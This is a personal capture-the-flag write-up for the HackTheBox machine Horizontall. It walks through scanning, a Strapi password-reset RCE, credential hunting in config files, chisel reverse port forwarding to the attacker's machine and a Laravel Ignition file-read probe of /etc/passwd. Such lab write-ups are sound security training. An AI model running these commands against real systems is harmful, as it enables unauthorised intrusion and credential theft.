# HACKTHEBOX - Horizontall

## Description
A write-up with a lot of personal note so is pretty messy!!

```bash
export IP=10.10.11.105
```

## Enumeration
```bash
alias rustscan='sudo docker run -it --rm --name rustscan rustscan/rustscan'
rustscan -a $IP -g # [22,80]

sudo nmap -v -sC -sV -p 22,80 -o nmap.txt $IP
```

**nmap result**:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Redirect to `domain name`
```bash
sudo subl /etc/hosts
# 10.10.11.105 horizontall.htb
```

brute-force directory: `nothing!!`
```bash
gobuster dir -w /usr/share/wordlists/dirb/common.tx -u http://horizontall.htb/
```

brute-force `vhost` in Host header: `something!!`
```bash
wfuzz -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -v -H "Host: FUZZ.horizontall.htb" --hc 301 -u http://horizontall.htb/

# OR 
gobuster vhost -u http://horizontall.htb/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt

# www
# api-prod

# gobuster subdomain ....
```
Also, inspect `js file`(html source code) --> api-prod....

**Virtual Host**: https://en.wikipedia.org/wiki/Virtual_hosting (vhost is just like independent webserver while subdomain like a sub main-folder of the web app)

**To access a vhost**:
```bash
/sudo subl /etc/hosts
# 10.10.11.105 horizontall.htb api-prod.horizontall.htb
```
**CMS**: `Strapi`

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt  -u http://api-prod.horizontall.htb/
# /admin
```
`/admin --> admin/auth/login`

In `init request`:
```json
{"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}
```
```bash
searchsploit strapi 3.0
# Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py
searchsploit -m multiple/webapps/50239.py
```
**CVE-2019-18818**: `strapi before 3.0.0-beta.17.5` `mishandles password resets` within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.

Object injection via ResetPassword parameter.

## Exploit
```bash
python3 50239.py http://api-prod.horizontall.htb
# [+] Password reset was successfully
# [+] Your email is: admin@horizontall.htb
# [+] Your new credentials are: admin:SuperStrongPassword1
# [+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQ0MTYzMTQ5LCJleHAiOjE2NDY3NTUxNDl9.7SGucFCRHNCi-HhW8xF4cZ9ZcV3l3GKU45hb9e7BiWc

# blind rce
# nc mkfifo --> reverse-shell
# python3 --> interactive shell

cat /etc/passwd | grep strapi # we have our own shell --> can establist a ssh shell
```

Reverse shell commonly fail maybe also because of bad characters, we can get around this by hosting a webshell.

**user flag**: `HTB{2dd8275a0606fd1eba918466557XXXXX}`

## Privileged Escalation
```bash
./linpeas.sh

# mamnual enumeration

# go to directory you wanna enumerate
grep -Ri password . # Or just make it ugly with /
env | grep DATA # SECRET_KEY
# ....
```

**Found**: but not useful!
```
-rw-rw-r-- 1 strapi strapi 351 May 26  2021 /opt/strapi/myapi/config/environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```

```bash
mysql -u developer
# Password: #J!:F9Zt2u
# nothing here!

su developer
# Password: #J!:F9Zt2u
# failed here!
```

**Scan ports in local**:
```bash
nc -z -v 10.10.11.105 1-10000 2>&1 | grep succeeded # dumb scan

# Download nmap binary to scan(linpeas not support ports scan subnet!!)
./nmap.sh localhost -v -p-

# using default command in linux <RECOMMENDED>
ss -l # investigate socket(check ports open)
```
**nmap results**:
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  unknown
3306/tcp open  mysql
8000/tcp open  unknown
```

```bash
curl localhost:8000 # web server here!, let's port forwarding
```

### Port Forwading
**Using Chisel**:
```bash
# kali machine
/chisel_1.7.3_linux_amd64 server -p 8989 --reverse &

# horizontall machine
# ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
./chisel_1.7.3_linux_amd64 client 10.10.14.32:8989 R:34567:127.0.0.1:8000 &
# This chisel client will connect back to our chisel server listening on port(8989) in our machine, port 34567 is local_port that forwarding to 8989 server port to port 8000 at horizontall machine. Need more explain here!!

# test
curl locahost:34567 # success!!
# Laravel v8 (PHP v7.4.18)
```

**Using SSH**:
```bash
# using SSH
ssh -i id_rsa strapi@horizontall.htb -L 34567:127.0.0.1:8000
#in ssh Command Prompt
> -L 8001:127.0.0.1:8000
```

### Exploit again
Google search `Laravel v8 (PHP v7.4.18)` --> debug mode to RCE --> https://esmyl.medium.com/exploiting-laravel-v8-30-0-php-v7-3-25-debug-rce-3731f69c33d7
```bash
curl -d '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "/etc/passwd%00"}}' -H 'Content-Type: application/json' http://127.0.0.1:34567/_ignition/execute-solution | grep failed
# ....failed to open stream:....
```

Error message "ErrorException: file_get_contents(/etc/passwd%00): failed to open stream:" indicates HOST is VULNERABLE! --> `CVE-2021-3129` Laravel  Ignition 

**exploit tool**: https://github.com/rocketscientist911/CVE-2021-3129/blob/master/exploit.py

Download and then just modify the path + command:
![edit the code](cve-2021-3129-exploit-file.png)

**root flag**: `HTB{21a933c797a8fc2623472fbf7e4XXXXX}`
